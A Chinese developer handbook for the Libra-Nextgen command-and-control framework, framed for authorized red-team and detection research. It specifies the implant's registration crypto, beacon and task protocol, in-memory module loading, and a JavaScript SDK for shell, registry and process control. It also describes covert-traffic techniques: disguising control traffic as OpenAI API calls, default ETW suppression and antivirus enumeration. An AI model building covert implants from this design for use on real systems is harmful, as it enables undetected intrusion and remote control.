# Libra Agent 开发手册:通信协议与 Agent 端 JavaScript SDK

> **适用读者**:需要为 Libra-Nextgen 开发/移植「另一个 Agent(被控端)」、或编写
> Agent 端 JS 能力(script 模块)的开发者。典型用途:**授权的红蓝对抗演练与蓝队
> 检测研究**——自研/改造 Agent 变体、生成真实形态的 beacon 流量用于 NDR/EDR 规则
> 验证、编写探测类模块模拟攻击者 TTP 等。
>
> **权威性**:本文档以当前仓库**真实实现**为准(逐节实现出处见文末
> 「[实现出处映射](#6-实现出处映射)」)。行为与本文不符时以源码为准并请更新本文。
>
> **合法使用**:本文档描述的是攻防对抗框架的协议与 SDK。仅允许在**已获授权**的
> 环境(自有资产、签署了测试协议的靶场/租户、红蓝对抗演习)中使用;禁止用于未授权
> 入侵。蓝队研究场景同样要求授权靶标与受控网络。
>
> **English version**: [Agent Development Handbook](en/agent-development.md)

---

## 1. 术语与总体架构

| 术语 | 含义 |
|---|---|
| Server / TeamServer | ASP.NET Core 服务端(默认端口 5270),负责注册、心跳、任务调度、模块下发 |
| Agent | 被控端。**参考实现为 Rust**(`src/agent-rs/`),beacon 式通信,模块按需内存加载 |
| Console | Web 控制台(React),通过 REST/WS 与 Server 交互,**不直接与 Agent 通信** |
| Task | 一条下发到 Agent 的指令(含 `commandType` / `command` / `arguments`) |
| Module | Agent 侧能力单元,两种实现通道:`script`(JS/QuickJS)与 `native`(Rust cdylib) |
| 会话(Session) | Agent 一次注册到下一次注册之间:持有 AES 会话密钥 + 会话 token |

三层之间只有 **Server ↔ Agent** 存在被控通道:

- Agent **没有 WebSocket**。实时交互走 **SSE 事件流**;WebSocket 只用于 Console
  (`/ws/console`),与 Agent 无关(`src/agent-rs/libra-comm/src/http.rs` 只有 HTTP/SSE 客户端)。
- 所有请求体在会话建立后均被 **AES-256-GCM** 加密;请求 URL/路径与外形由
  **Malleable Profile** 伪装(可配置入口、路径后缀、UA、额外请求头、字段名混淆)。
- Agent 侧模块按需从 Server **下载到内存**执行,不落盘(`script` 源与 `native` cdylib 皆然)。

### 1.1 一次任务的生命周期

```text
Console/插件/MCP ──(REST,带 JWT)──▶ Server 创建 Task
                                        │
          ┌─────────────────────────────┴──────────────────────────┐
          ▼                                                         ▼
  心跳轮询:Agent POST hb ──▶ 响应 pendingTask               SSE 推送:op:"task"
          │                                                         │
          └──────────────────────┬──────────────────────────────────┘
                                 ▼
                    Agent 收到 AgentTask(按 taskId 去重)
                                 ▼
         resolve_task:按 commandType 决定调用哪个 Module
         (module 未加载 → op:"mod" 从 Server 下载,内存加载)
                                 ▼
                  模块入口执行(input = UTF-8 JSON)
                                 ▼
                 Agent POST res 回传 TaskResult{taskId,...}
```

---

## 2. 通信协议规格(给「另一个 Agent 实现」)

> 本节写给想**新写一个兼容 Agent** 的开发者:只要实现本节契约,即可被 Libra-Server
> 正常纳管(注册、收任务、回报结果)。参考实现阅读入口:
> `src/agent-rs/libra-comm/src/http.rs`(HTTP 客户端)、
> `src/agent-rs/libra-engine/src/engine.rs` + `engine/heartbeat.rs`(调度状态机)、
> `src/agent-rs/libra-crypto/src/lib.rs`(密码学)。

### 2.1 网络通道与路径伪装

服务端前置 `BeaconEntryMiddleware`(`src/LibraNextgen.Server/Middleware/BeaconEntryMiddleware.cs`)
把「看起来人畜无害」的对外路径**内部重写**为真实 beacon 控制器:

| 对外形态(Agent 实际请求的 URL) | 内部重写为 | 用途 |
|---|---|---|
| `POST {server}/{entryPath}[/{suffix}]`(如 `/api/user/info`) | `/api/beacon/handle` | 可塑信封入口(旧式 envelope 通道) |
| `POST {server}/{aiPath}`(默认 `/v1/chat/completions`) | `/api/beacon/ai` | **伪 LLM API 通道**:心跳/结果/模块下发主通道 |
| `GET  {server}/api/v1/models/events` | `/api/beacon/events` | **SSE 事件流**:任务推送 |
| `/api/beacon/*` | 透传,不重写 | 真实控制器(注册、core-key 等) |

- `entryPath` 默认 `/api`;`pathSuffixes` 默认如 `user/info`、`orders/list`、`profile`、
  `settings`、`notifications`、`messages/unread`(Agent 随机挑选后缀拼在入口后)。
- 这些外形参数(含 AI 通道的路径/模型名/认证前缀)全部由**注册响应中的 `profile`** 下发,
  后续请求才启用伪装;注册请求本身走固定路径。

### 2.2 密码学约定(双端必须一致)

- **AES-256-GCM**,密文布局固定为 `nonce(12B) ‖ tag(16B) ‖ ciphertext`,整体 base64。
  实现对照:C# `CryptoHelper`(`src/LibraNextgen.Common/Protocol/CryptoHelper.cs`)↔
  Rust `libra_crypto::encrypt_payload/decrypt_payload`(`libra-crypto/src/lib.rs`)。
- **RSA-2048 / RSA-OAEP-SHA256**,公钥以 **SPKI DER** base64 传输(不是 PKCS#1)。
- **pre-session key** = `SHA-256(beacon_secret)`(32B)。beacon secret 构建期埋入 Agent、
  服务端配置,双方无需交换即可派生,用于给「首次注册握手」加密。
- **会话密钥(session key)**:注册时 Server 生成随机 32B AES 密钥,用 Agent 在注册请求中
  携带的**临时 RSA 公钥** OAEP 加密后返回(`session_key` 字段);此后全部会话期通信用它加密。

### 2.3 注册/握手

Agent 启动后生成本次运行的临时 RSA-2048 密钥对,采集
`hostname / userName / osVersion / arch / processName / pid / isElevated / publicKey / hardware`,
并附上构建期注入的 `heartbeatIntervalMs`(Agent 自报心跳间隔,毫秒),
按构建期配置选择三种模式之一(请求体字段一律 camelCase):

**模式 A —— loader/混合信封(有构建期注入的 `server_public_key`,推荐新路径)**

```http
POST {server}/api/v1/session
Content-Type: application/json

{ "grant_type": "client_credentials",
  "client_id":   "<AES-GCM(注册JSON), 用随机AES密钥>",
  "client_secret":"<RSA-OAEP(该AES密钥), 用server_public_key>" }
```

服务端 `ServerKeyService.OpenEnvelope(client_secret, client_id)` 解出明文注册 JSON。
(Rust 端 `libra_crypto::hybrid_encrypt` 产出 `(enc_key, cipher_body)`,分别放入
`client_secret` / `client_id`。)

**模式 B —— 无 beacon secret 的明文注册(默认注册路径)**

```http
POST {server}/api/beacon/register
Content-Type: application/json

{ "hostname":"...","userName":"...","osVersion":"...","arch":"...",
  "publicKey":"<SPKI DER b64>","beaconSecret":"","hardware":{...},
  "hasSessionKey":false,"heartbeatIntervalMs":3000 }
```

该端点同样接受 `{"payload": "<AES-GCM(pre-session key, 注册JSON)>"}` 的加密单字段形式。

**模式 C —— 有 beacon secret 的可塑信封**

以 pre-session key 加密 `{"op":"reg","id":"","data":"<注册JSON>"}` 整体,按
§2.4 的 envelope 字段打包(§2.5 加密形式之一),POST 到 profile 入口路径(重写为
`/api/beacon/handle`,走 `reg` op)。

**注册响应**(三种模式一致,明文返回;`session_key` 本身已被 RSA-OAEP 保护,中间人
可读但解不开):

```jsonc
{
  "agent_id": "…",                    // Server 侧持久 Agent ID
  "session_key": "<RSA-OAEP(AES-256会话密钥) b64>",  // hasSessionKey=true 时为空
  "session_token": "<不透明会话token>",              // 后续上线标识,每次注册轮换
  "ws_url": "ws://…/ws/chat",                        // 仅 Console 用,Agent 忽略
  "heartbeat_interval_ms": 60000,                    // 回显 Agent 注册时自报的心跳间隔(旧 Agent 回退 profile 值)
  "jitter_percent": 0.2,                             // 抖动提示
  "profile": { /* ProfileTransform,见下 */ }
}
```

`profile` 字段(Agent 端模型 `libra_common::models::ProfileTransform`):

| 字段 | 含义 |
|---|---|
| `entryPath` / `pathSuffixes` | 信封入口路径与随机后缀池 |
| `dataKey` / `tsKey` / `randKey` / `signKey` / `tokenKey` | envelope 外层字段名混淆(默认 `d`/`ts`/`r`/`sign`/`sid`) |
| `userAgents` | UA 轮换池(空则用默认 UA) |
| `extraHeaders` | 额外请求头,形如 `"Header: value"` 字符串数组 |
| `paddingMin` / `paddingMax` | 明文后追加换行填充量范围(混淆密文长度) |
| `heartbeatIntervalMs` / `jitterPercent` | 心跳参数(可覆盖注册响应顶层字段) |
| `aiPath` / `aiModels` / `authPrefix` | 伪 AI 通道路径、模型名单、Bearer 前缀 |

### 2.4 会话期操作码(op)

会话建立后所有加密明文都是同一个信封结构(注册 op 亦同):

```jsonc
{ "op": "reg" | "hb" | "res" | "mod",
  "id": "<session_token>",
  "data": "<JSON 字符串>" }
```

| op | data 内容 | 方向 | 说明 |
|---|---|---|---|
| `reg` | 注册 JSON | → | 仅用于模式 C 的入口信封 |
| `hb` | `{"ts": <epoch毫秒>}` | → | 心跳,响应见 §2.6;服务端校验 `ts` 与当前时间差 ≤ 120s(防重放) |
| `res` | `TaskResult` JSON | → | 任务结果回传,响应 `{"status":"received"}` |
| `mod` | `{"name": "<module>"}` | → | 请求下载模块;响应 = 模块产物字节(base64) |

### 2.5 伪 AI 通道(心跳 / 结果 / 模块的主通道)

参考 Agent 的 `post_ai`(`http.rs`)把每个会话期请求伪装成 OpenAI 风格 Chat Completions:

```http
POST {server}/v1/chat/completions        # 即 profile.aiPath
Content-Type: application/json
Authorization: Bearer sk-<96位hex>        # authPrefix + 随机hex,仅装饰
User-Agent: <profile.userAgents 轮换>

{
  "model": "gpt-4o-mini",                # profile.aiModels 随机
  "stream": true,
  "messages": [{ "role": "user",
                 "content": "data:image/jpeg;base64,<AES密文>" }],
  "user": "<session_token>"              # 服务端用它定位会话与 AES 密钥
}
```

其中 `<AES密文>` = 对 `{"op":…,"id":token,"data":…}`(先按 `paddingMin..paddingMax`
追加 `\n` 填充)做 AES-256-GCM 加密后的 base64。

服务端(`/api/beacon/ai` 处理逻辑):

1. 取 `messages[0].content`,剥掉 `data:image/jpeg;base64,` 前缀 → 密文;
2. 用 `user`(= session_token)解析出 agent 与会话密钥并解密;
3. 处理 op 后把响应明文 **再次 AES 加密**,切成 ≤60KB 的块,以 **SSE 流**返回,
   每块是一个 `chat.completion.chunk` 的 `delta.content`:

```text
data: {"id":"chatcmpl-…","obj":"chat.completion.chunk","created":…,
       "model":"gpt-4o-mini","choices":[{"index":0,"delta":{"content":"<密文块>"},
       "finish_reason":null}]}

data: [DONE]
```

Agent 侧把各块 `delta.content` **拼接**成完整密文再解密。

> **会话丢失判定**:AI 通道与 SSE 通道收到 **401/404** → 会话失效(`SESSION_LOST`),
> Agent 清空会话密钥/token,指数退避后重新注册(见 §2.8)。

### 2.6 心跳(轮询收任务)

`hb` op 的响应明文为:

```jsonc
{ "status": "ok", "pendingTask": null }          // 无任务
{ "status": "ok", "pendingTask": { /* AgentTask, §2.7 */ } }   // 有一个待办
```

- 心跳间隔在注册时由 Agent 自报(`heartbeatIntervalMs`,毫秒,构建期注入);Server 存下该值、
  回显给 Agent,并按「自报间隔 + 5s」作为该 Agent 的下线超时。旧 Agent 未上报时回退到
  profile 的心跳间隔。抖动仍以注册响应 `jitterPercent` 为准。
- Agent 端收不到注册响应时的内置回退间隔为 10000ms;抖动算法
  `x86_style_jitter`(`libra-engine/src/config.rs`):
  以 1/12 概率把间隔拉长到 1.5–3 倍,否则在 ±`base*jitterPercent` 内随机;下限 500ms。
- SSE 连接与心跳并发存在,互不阻塞;**任务既可能随心跳 `pendingTask` 返回,
  也可能随时经 SSE 推送**,Agent 按 taskId 去重(内存去重集合,上限 512 条)。
- SSE 连接本身就是「进程存活」证明:服务端 30s 一次 keepalive(`: ping`)并刷新 lastSeen;
  只要 SSE/WS 仍在线,心跳晚到也不会被判定离线。

### 2.7 AgentTask(任务契约,全字段 camelCase)

```jsonc
{
  "id": "…",                 // 任务 ID(去重与结果回引用)
  "agentId": "…",
  "createdBy": "…",
  "commandType": "Generic",  // 枚举见下表
  "command": "script",       // 语义随 commandType 变化
  "arguments": ["<JSON 字符串>", …],
  "status": "Pending",       // Pending/Sent/Running/Completed/Failed/Cancelled
  "output": null, "error": null,
  "timeoutSeconds": 60
}
```

`resolve_task`(`libra-engine/src/engine/heartbeat.rs`)对 `commandType` 的映射:

| commandType | 行为 | 调用的 Module |
|---|---|---|
| `Shell` | `command` 为命令行 | `shell` |
| `PowerShell` | `command` 为脚本;`arguments` 含 `etwSuppress=false` 时关闭 ETW 抑制 | `powershell` |
| `LocalAccounts` | 采集本地账户 | `recon` |
| `Proxy` | `command` 为目标 URL | `proxy` |
| `FileList` / `FileDrives` | 列目录 / 列盘符 | `files`(盘符走平台执行器) |
| `Upload` / `Download` | `command`=路径,`arguments[0]`=内容(下载即写盘) | `files` |
| `Kill` | `command`=PID | `recon` |
| `Generic` | **通用模块调用**:`command`=模块名;`arguments[0]`=JSON 输入;`arguments` 含 `isolated=true` 时隔离执行(服务端对 `creds` 自动追加) | 任意模块(含 `script`) |
| `Sleep` | 占位响应 `{"status":"sleeping"}` | — |
| `KillAndClean` | 回执后清理持久化并退出进程 | —(自毁) |
| `Restart` | 回执后拉起自身副本并退出 | —(自重启) |
| 其它(如 `WifiScan`) | 占位 `{"status":"ok","commandType":"…"}` | — |

### 2.8 重连与生命周期

```text
注册成功 ──▶ [hb 轮询任务] ═╗
             [SSE 事件流] ══╣──▶ 收到任务 → 去重 → 解析模块 → 执行 → res 回传
                                ▲
             401/404(SESSION_LOST)│  任意通道报错:
                                │   - 先快速重试 2 次(间隔 1.5s)
                                │   - 仍失败 → 指数退避 5s→10s→…→上限 300s
                                └──────────▶ 清空会话 → 重新注册
```

- SSE 流每次随机存活 300–900s 后主动断开轮换,断开后 3s 重连。
- `run()` 主循环对一切非 SESSION_LOST 错误做指数退避重试;SESSION_LOST 立即重置退避。

### 2.9 结果回传

模块执行完毕,Agent 先包装再上报:

```jsonc
// 包装规则:success = (输出 JSON 对象不含 "error" 键 && success != false)
{ "taskId": "<taskId>", "success": true,
  "output": "<模块原始输出字符串>", "error": null }
```

然后作为 `res` op 的 `data` 提交(§2.5 通道),服务端落库并通知等待方(插件动作网关/
MCP 会同步等待该 task 完成,默认 60s,超时则取消 pending 任务)。

### 2.10 模块下载与 ABI

- `op:"mod"` + `{"name":"shell"}` → 响应(base64 解出后)为**平台对应产物**:
  `build-output/modules/{platform}/{name}.{dll|so}`(`linux*` 平台用 `.so`,其余 `.dll`)。
- 模块名白名单(云端模块):`shell`、`recon`、`creds`、`files`、`powershell`、`proxy`、`script`。
- **script 模块本身也是一个 native cdylib**(`modules/script` crate,导出名 `script`);
  它的「输入」里装着待执行的 JS 源码(见 §3)。平台键:
  `x64` / `x86` / `win-arm64` / `linux-x64` / `linux-arm64` / `mac-arm64`
  (`src/LibraNextgen.Server/Models/BuilderModels.cs::BuildPlatforms`)。
  > 注意:win-arm64 模板暂不含 `script` 模块(rquickjs 缺该平台预生成 bindings),
  > script 通道在该平台不可用——见 `docs/platform-support.md`。
- **ABI(与 native 模块一致,`libra-load`)**:

```text
module_name() -> *const u8          // C 字符串,必须等于请求的模块名(自校验)
module_main(input: *const u8, input_len: usize,
            output: *mut u8, output_cap: usize) -> usize   // 写入的字节数
```

  输入输出均为 UTF-8 JSON;单次输出上限 16MB。
- 执行模型:`ModuleManager` 下载后**内存加载**(不落盘);执行放到 blocking 线程池且
  **不持模块管理器锁**(并发任务可并行);服务端标记 `isolated=true` 的模块(Linux)在
  **fork 出的子进程**里跑,崩溃不影响 Agent 本体(Windows 无 fork,退化为进程内执行)。
- Agent 侧对下载产物做自校验:`module_name` 缺失或与请求名不一致 → 拒载报错。

### 2.11 服务端 beacon 端点速查(内部真实路径)

| 方法 & 路径 | 说明 |
|---|---|
| `POST /api/v1/session` | 注册模式 A(OAuth 风格混合信封) |
| `POST /api/v1/auth/token` | loader 换取 core 解密密钥 + 一次性下载票 |
| `GET /api/v1/models/{buildId}?t=<ticket>` | loader 下载 core 载荷 |
| `POST /api/beacon/register` | 注册模式 B(明文或 `payload` 加密) |
| `POST /api/beacon/handle` | 模式 C envelope(入口路径重写而来;`reg/hb/res/mod` op) |
| `POST /api/beacon/ai` | 伪 AI 通道(`/v1/chat/completions` 重写而来) |
| `GET /api/beacon/events` | SSE(`/api/v1/models/events` 重写而来;`X-Session-Token`) |
| `POST /api/beacon/heartbeat|result|module` | 旧式信封端点(头 `X-Request-Id`=token 或 `X-Agent-Id`) |
| `POST /api/beacon/core-key` | loader 协商 core 解密密钥 |
| `GET /api/beacon/artifact/{buildId}`、`/api/beacon/core/{buildId}` | 构建产物/核心下载 |

> 新 Agent 建议只实现:**模式 A 注册 + AI 通道(hb/res/mod)+ SSE(events)**,
> 与参考 Rust Agent 行为一致;旧端点保留兼容旧版本。

### 2.12 「新写一个 Agent」的最小核对清单

- [ ] 注册(§2.3)成功,拿到 `agent_id` + `session_token` + RSA-OAEP 加密的 `session_key`(用临时 RSA 私钥解出)
- [ ] 心跳(hb)返回 `pendingTask`;间隔/抖动取自注册响应
- [ ] SSE(`X-Session-Token`)能收到 `{"op":"task","data":AgentTask}`(密文)并解密
- [ ] 任务去重 + 按 `commandType` 派发;`Generic` 时按 `arguments[0]` JSON 构造模块输入
- [ ] 模块缺失时 `mod` op 下载并自校验(`module_name`)
- [ ] 结果按 §2.9 包装后经 `res` op 回传
- [ ] 401/404 → 清理会话 → 退避重注册
- [ ] 全部会话期密文用同一 AES-256-GCM 密钥,`nonce‖tag‖cipher` 布局正确
      (可先与 Server 联调,或对照 `libra-crypto` 测试向量)

---

## 3. Agent 端 JavaScript SDK(script 模块)

> 这是给**插件/能力作者**的 API 权威参考。安装包结构、`meta.json` 契约与 zip 组织见
> [`docs/zh/plugin-development.md`](zh/plugin-development.md) 的「Agent 通道 / script」;
> 本文只深入 **JS 运行时本身**。参考实现:`src/agent-rs/modules/script/`。

### 3.1 什么是 script 模块

- **零编译**:插件 `module/xxx.js` 是纯 JS 文本,经 Server 原样放入任务输入,由 Agent
  内嵌的 **QuickJS(rquickjs)沙箱**在内存执行。
- 任务输入(§2.7 `Generic` 的 `arguments[0]`,服务端插件网关自动构造):

```jsonc
{ "script": "<JS 源码>",     // 必需
  "args":   { "op": "…", "…": "…" },   // 传给入口函数的参数对象
  "entry":  "main",          // 入口函数名,默认 main
  "features": [] }           // 能力门控;当前调用方固定传空数组
```

- 模块输出(即 `script` cdylib 的 module_main 输出):

```jsonc
{ "ok": true,  "result": <入口函数返回值 JSON 序列化> }
{ "ok": false, "error": "<引擎/脚本错误信息>" }
```

  该输出作为 §2.9 的 `TaskResult.output`(字符串)原样上送。

### 3.2 沙箱边界(硬性约束)

- 裸 QuickJS:**没有** `fetch` / `require` / `setTimeout` / `console` / `XMLHttpRequest`
  等宿主能力;全局 `eval`、`Function`、`gc`、`print` 被显式删除(引擎初始化时
  `drop_globals`,见 `engine.rs`)。
- 日志用 `log()`(落到 Agent 日志,前缀 `[script]`)。
- 平台分支用 **`__platform()`** 做**运行时**判断(无编译期分支);平台专属函数只在
  对应平台注册,跨平台调用会得到「not a function」。
- 宿主对象原型不可达(不暴露任何 Rust 对象原型),JS 无法自扩展沙箱。
- `env.set()` 是**故意 no-op**(agent 多线程下改进程环境是 UB)。

### 3.3 入口函数与值转换

- 脚本必须定义一个函数(默认名 `main`),接收反序列化后的 `args` 对象,返回
  JSON 可序列化的值;未找到入口函数会报错:

```text
entry function 'main' not found (script must define `function main`)
```

- JS → JSON 转换规则(引擎 `js_to_json`):`undefined`/`null` → `null`;
  bool → bool;number 整数 → int64、否则 f64;string → string;数组/对象递归;
  函数/宿主对象/Symbol → 字符串化占位 `"<type>"`。
- JSON → JS 同理递归构造,仅用原始构造器与 Object/Array。

### 3.4 全局 API 全量参考

#### 通用(所有平台,`api_common.rs`)

| API | 签名 | 返回 / 行为 |
|---|---|---|
| `fs.read(path)` | `fs.read("/etc/hosts")` | `string`;失败返回 `"read error: …"` 字符串(不是异常) |
| `fs.write(path, content)` | | `boolean` |
| `fs.list(path)` | | `string[]`(目录内文件名) |
| `fs.exists(path)` | | `boolean` |
| `proc.list()` | | `[{ pid, name }]`(Windows 走 `tasklist /FO CSV /NH`,其余走 `ps -eo pid=,comm=`) |
| `proc.kill(pid)` | | `boolean`(Windows `taskkill /PID x /F`,其余 `kill`) |
| `env.get(name)` | | `string`,取不到为空串 |
| `env.set(name, value)` | | 无返回值,**no-op**(见 §3.2) |
| `whoami()` | | `string`(`USERNAME` / `USER`) |
| `log(msg)` | | `void`,写入 Agent 日志 |
| `__platform()` | | `"windows" \| "linux" \| "macos" \| "unknown"` |
| `exec.run(program, args, opts)` | `exec.run("/bin/sh", ["-c","echo $X"], {env:{X:"1"}, cwd:"/tmp", timeoutSeconds:30})` | 同步等待结果(默认超时 30s,到时强杀):`{success, exitCode, stdout, stderr, timedOut}` |
| `exec.spawn(program, args, opts)` | | 立即返回:`{success, pid}`(detached 后台进程;`opts` 仅用 `env`/`cwd`) |

`exec.run`/`exec.spawn` 的 `opts` 均为可选:`{env: {k:v}, cwd: string, timeoutSeconds: int}`。
子进程与 Agent 隔离(独立进程),崩溃/超时不影响 Agent。

#### Windows 专属(`api_windows.rs`,仅 `__platform()==="windows"` 注册)

| API | 签名 | 行为 |
|---|---|---|
| `cmd(cmdline)` | `cmd("whoami")` | `cmd /C <cmdline>`,返回 stdout(stderr 兜底) |
| `powershell(script)` | | **进程内执行** PowerShell(经 `libra-psinline`,默认抑制 ETW),60s 超时 |
| `reg_query(key, name)` | `reg_query("HKLM\\...","Name")` | `reg query <key> /v <name>` 输出字符串 |
| `reg_set(key, name, data)` | | `boolean`(`reg add /f`) |
| `reg_delete(key, name)` | | `boolean`(`reg delete /f`) |
| `ipconfig()` | | `ipconfig /all` 输出 |
| `wmic(query)` | `wmic("process list brief")` | 输出字符串 |
| `tasklist()` | | `tasklist /FO LIST` 输出 |
| `__winapi_reserved()` | | 仅 `features` 含 `"full"` 时注册;当前返回占位文案(未接线) |

#### Linux / macOS 专属(`api_linux.rs`,Windows 之外注册)

| API | 签名 | 行为 |
|---|---|---|
| `shell(cmdline)` | `shell("uname -a")` | `/bin/sh -c` 输出 |
| `bash(script)` | | `/bin/bash -c` 输出 |
| `uname()` | | `uname -a` |
| `ip_route()` | | `ip addr`(失败回退 `ifconfig`) |
| `ss(path)` | `ss("/proc/cpuinfo")` | **读取 /proc 或 /sys 文本文件**(注意:不是网络 ss!) |
| `hostname()` | | `hostname` |
| `dns()` | | `cat /etc/resolv.conf` |
| `__syscall_reserved()` | | 仅 `features` 含 `"full"` 时注册;占位(未接线) |

> `features` 数组由任务输入携带;Server 的插件网关/MCP 目前固定传 `[]`。若未来需要
> 门控 `"full"` 能力,仅需在任务输入 `features` 中带上——平台注册逻辑已就绪。

### 3.5 编写规范

1. **返回可 JSON 序列化的值**;布尔「成功」请用对象 `{ok: true/false}` 表达(约定俗成)。
2. 需要 `op` 分支时,`args.op` 由服务端按 `meta.json` 的 `module.op` 注入,与调用方
   参数合并后一起传入。
3. **控制执行时长**:入口函数同步阻塞于 Agent 的执行线程;长任务请自行用
   `exec.run` 子进程 + `timeoutSeconds` 兜底,避免超时被服务端判失败。
4. 平台差异一律 `__platform()` 运行时分支;不要假定 `cmd`/`shell` 存在。
5. 用 `log()` 记录关键步骤(出现在 Agent 日志,便于排查)。
6. 敏感/大输出注意 §2.9 的 16MB 模块输出上限与 Task 超时(插件网关默认 60s)。
7. **文件/命令出错时函数多数返回错误字符串而非抛异常**,取用时注意判 `success` 字段或前缀。
8. JS 代码注释遵循仓库规范(英文),`main` 函数名与 `meta.json` `entry` 一致(默认 `main`)。

### 3.6 示例

**示例 1:hello/系统信息(跨平台写法,源自 `Libra-Plugin-Template/module/main.js`)**

```js
function main(args) {
    var op = args.op || "hello";
    if (op === "hello") {
        return { "message": "hello, " + (args.name || "world") + "!", "__platform": __platform() };
    }
    if (op === "system") {
        var info;
        if (__platform() === "windows") info = cmd("ver");
        else if (__platform() === "linux") info = uname();
        else info = "unsupported platform";
        return { "system": info };
    }
    return { "ok": true, "op": op };
}
```

**示例 2:进程枚举 + 匹配(源自真实插件 `com.libra.av-list/module/main.js`,已精简)**

```js
var AV_MAP = { "msmpeng.exe": "Windows Defender", "avp.exe": "Kaspersky" /* … */ };

function main(args) {
    var procs = proc.list();          // [{pid, name}]
    var matched = [];
    for (var i = 0; i < procs.length; i++) {
        var key = (procs[i].name || "").toLowerCase();
        if (AV_MAP[key] !== undefined)
            matched.push({ name: procs[i].name, product: AV_MAP[key], pid: procs[i].pid });
    }
    return { ok: true, platform: __platform(), total_processes: procs.length, matched: matched };
}
```

**示例 3:命令执行 + 超时兜底(适合蓝队研究里模拟一次性探测动作)**

```js
function main(args) {
    var probe = args.probe || "whoami";
    var argv = __platform() === "windows"
        ? ["cmd", ["/C", probe]]
        : ["/bin/sh", ["-c", probe]];
    var r = exec.run(argv[0], argv[1], { timeoutSeconds: 10 });
    if (!r.success) return { ok: false, error: r.stderr || "exit " + r.exitCode };
    return { ok: true, output: r.stdout };
}
```

更多真实脚本:安装目录 `src/plugins/com.libra.av-list/module/main.js`(运行时状态,不入库)、
模板 `Libra-Plugin-Template/module/main.js`(入库);插件源码维护在独立仓库
[Libra-Plugins](https://github.com/SmaZone2020/Libra-Plugins)。

### 3.7 触发方式(两种)

1. **插件动作网关(推荐)**:Console 页面或 MCP 调
   `POST /api/plugins/{pluginId}/{action}`,body `{agentId, args}` → Server 读
   `module/{name}.js` 源码、按 `meta.json` 组包(§3.1 输入)→ `RelayService` 创建
   `Generic` 任务(`command:"script"`)、同步等待结果(默认 60s,超时返回 504 并取消任务)。
   meta 声明示例(与 §3.1 输入对应):

```jsonc
"actions": [{
  "action": "detect",
  "module": { "kind": "script", "name": "main", "op": "detect", "entry": "main" }
}]
```

2. **直接创建任务**(调试/无插件场景,经 Console `POST /api/tasks`,带 JWT):

```http
POST /api/tasks
Authorization: Bearer <console jwt>

{ "agentId": "…",
  "commandType": "Generic",
  "command": "script",
  "arguments": [ "{ \"script\": \"function main(a){return {pong:true};}\", \"args\": {}, \"entry\": \"main\", \"features\": [] }" ],
  "timeoutSeconds": 60 }
```

任务完成后 `output` 字段是字符串,内容是模块输出的 JSON:`{"ok":true,"result":{…}}`
(两层 JSON:外层 task 包装 + 内层 script 模块包装)。

---

## 4. 蓝队研究场景建议

把本框架当作「可编程的攻击行为模拟器」在**授权靶场**里使用,能有效支撑检测研究:

| 场景 | 做法 | 观测点(供蓝队验证) |
|---|---|---|
| NDR/代理日志规则验证 | 用可塑 profile 的不同入口/后缀/UA/请求头造流量,对比 EDR/NDR 与旁路日志 | 伪装通道的外形漂移、心跳节律统计 |
| 主机指纹与进程行为了解 | script 模块枚举进程/网络/账户,回报真实形态数据 | 与攻击模拟器行为基线对比 |
| 检测规则假阳性控制 | 编写"干净流量"模块(普通 HTTP 会话形态)与恶意模块对照 | SIEM 规则命中率 |
| 变体移植验证 | 按 §2.12 自研一个最小 Agent(如 Go/Python 原型) | 检测是否只依赖某一 Agent 实现特征 |

通用纪律:

- **只打授权靶标**,网络隔离(独立 VLAN/靶场),避免触达生产与互联网。
- 模拟动作落地后**尽快清理**(`KillAndClean` 自毁任务可撤销持久化并退出)。
- 结果与流量留档,用于复盘与规则调优;蓝队侧建议对接 Server 的审计日志与任务记录。
- 本文不提供任何绕过/免杀细节;请把精力放在协议行为、检测验证与防御改进上。

---

## 5. 相关文档

- 插件开发(三层结构 / meta.json / 双通道):[`docs/zh/plugin-development.md`](zh/plugin-development.md)、[`docs/en/plugin-development.md`](en/plugin-development.md)
- HTML 插件页面 SDK(`window.Libra`):[`docs/plugins/html-plugin-sdk.md`](plugins/html-plugin-sdk.md)
- 平台构建/运行矩阵:[`docs/platform-support.md`](platform-support.md)
- 部署(环境变量/密钥/nginx):[`docs/deployment.md`](deployment.md)
- 架构总览:[`../CLAUDE.md`](../CLAUDE.md)(仓库内开发规范与架构说明)

---

## 6. 实现出处映射

> 维护本文时,改协议描述前先对照下列文件;双向同步。

| 章节 | 实现文件(仓库根相对) |
|---|---|
| §2.1 路径伪装 | `src/LibraNextgen.Server/Middleware/BeaconEntryMiddleware.cs` |
| §2.2 密码学 | `src/LibraNextgen.Common/Protocol/CryptoHelper.cs`、`src/agent-rs/libra-crypto/src/lib.rs` |
| §2.3 注册 | `src/LibraNextgen.Server/Controllers/V1BootstrapController.cs`(session)、`AgentCommsController.cs`(register/handle)、`src/agent-rs/libra-comm/src/http.rs`(register) |
| §2.4/§2.5 信封与 AI 通道 | `src/LibraNextgen.Server/Controllers/AgentCommsController.cs`(AiChannel)、`src/agent-rs/libra-comm/src/http.rs`(post_ai/build_body) |
| §2.6 心跳 / SSE | `AgentCommsController.cs`(Events)、`src/agent-rs/libra-engine/src/engine.rs`、`engine/heartbeat.rs`、`libra-comm/src/http.rs`(open_events/heartbeat) |
| §2.7 任务契约 | `src/LibraNextgen.Common/Models/Task.cs`、`src/agent-rs/libra-common/src/models.rs`、`libra-engine/src/engine/heartbeat.rs`(resolve_task) |
| §2.8 重连 | `src/agent-rs/libra-engine/src/engine.rs`、`config.rs`(x86_style_jitter) |
| §2.9 结果 | `heartbeat.rs`(wrap_result)、`src/LibraNextgen.Server/Services/AgentCommsService.cs`(TaskResult) |
| §2.10 模块 | `src/agent-rs/libra-engine/src/module_manager.rs`、`libra-load/src/lib.rs`、`src/LibraNextgen.Server/Services/BuilderBuildService.cs`(CloudModules) |
| §3 JS SDK | `src/agent-rs/modules/script/src/engine.rs`、`api_common.rs`、`api_windows.rs`、`api_linux.rs`、`lib.rs` |
| §3.7 触发链路 | `src/LibraNextgen.Server/Controllers/PluginActionController.cs`、`Services/RelayService.cs`、`Services/PluginService.cs`、`Mcp/PluginTools.cs` |
